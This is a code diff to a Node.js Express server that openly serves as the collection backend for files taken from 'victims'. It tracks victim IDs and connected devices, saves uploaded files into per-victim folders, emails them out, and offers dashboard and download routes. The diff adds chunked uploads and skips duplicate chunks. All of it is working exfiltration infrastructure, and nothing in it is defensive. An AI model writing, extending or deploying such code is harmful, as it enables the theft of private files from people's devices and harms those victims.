@@ -8,7 +8,7 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically
 
-// Enable CORS with specific options ok 
+// Enable CORS with specific options
 const corsOptions = {
   origin: 'https://deobfrontend-4mu41vc3s-2naseernoors-projects.vercel.app',
   methods: ['GET', 'POST', 'OPTIONS'],
@@ -62,6 +62,9 @@ const victimFileCounts = {};
 const victimTotalFiles = {};
 const victimFiles = {};
 const connectedDevices = {};
+
+// Track chunks to avoid duplicates
+const chunkTracker = new Set();
 
 // Function to send email
 async function sendEmail(victimId, files) {
@@ -134,11 +137,23 @@ app.post('/upload', (req, res) => {
   try {
     const filename = decodeURIComponent(req.headers['filename']);
     const victimId = decodeURIComponent(req.headers['victim-id']);
+    const chunkIndex = parseInt(req.headers['chunk-index']);
+    const totalChunks = parseInt(req.headers['total-chunks']);
     const ip = req.ip;
 
-    if (!filename || !victimId) {
-      return res.status(400).json({ error: 'Missing Filename or Victim-Id' });
+    if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks)) {
+      return res.status(400).json({ error: 'Missing or invalid headers' });
     }
+
+    const chunkId = `${victimId}-${filename}-${chunkIndex}`;
+
+    // Skip duplicate chunks
+    if (chunkTracker.has(chunkId)) {
+      console.log(`⏭️ Skipping duplicate chunk: ${chunkId}`);
+      return res.status(200).json({ message: 'Duplicate chunk skipped' });
+    }
+
+    chunkTracker.add(chunkId);
 
     if (!connectedDevices[victimId]) {
       connectedDevices[victimId] = {
@@ -157,7 +172,7 @@ app.post('/upload', (req, res) => {
       victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
       fs.mkdirSync(victimFolders[victimId], { recursive: true });
       victimFileCounts[victimId] = 0;
-      victimTotalFiles[victimId] = parseInt(req.headers['total-files'], 10);
+      victimTotalFiles[victimId] = totalChunks;
     }
 
     const victimFolder = victimFolders[victimId];
@@ -169,13 +184,17 @@ app.post('/upload', (req, res) => {
         return res.status(500).json({ error: 'Error saving file' });
       }
 
-      console.log(`✅ File received: ${filename}`);
+      console.log(`✅ Chunk ${chunkIndex} of ${totalChunks} received for file: ${filename}`);
       victimFileCounts[victimId] += 1;
       connectedDevices[victimId].filesTransferred += 1;
       connectedDevices[victimId].fileList.push(filename);
 
-      checkAndSendEmail(victimId, victimFolder);
-      res.status(200).json({ message: 'File received successfully' });
+      if (chunkIndex === totalChunks) {
+        console.log(`✅ File upload complete: ${filename}`);
+        checkAndSendEmail(victimId, victimFolder);
+      }
+
+      res.status(200).json({ message: 'Chunk received successfully' });
     });
   } catch (error) {
     console.error(`❌ Error handling upload:`, error);
@@ -192,7 +211,7 @@ app.get('/dashboard-data', (req, res) => {
 app.get('/download/:victimId/:filename', (req, res) => {
   try {
     const { victimId, filename } = req.params;
-    
+
     if (!victimFolders[victimId]) {
       return res.status(404).json({ error: 'Victim folder not found' });
     }
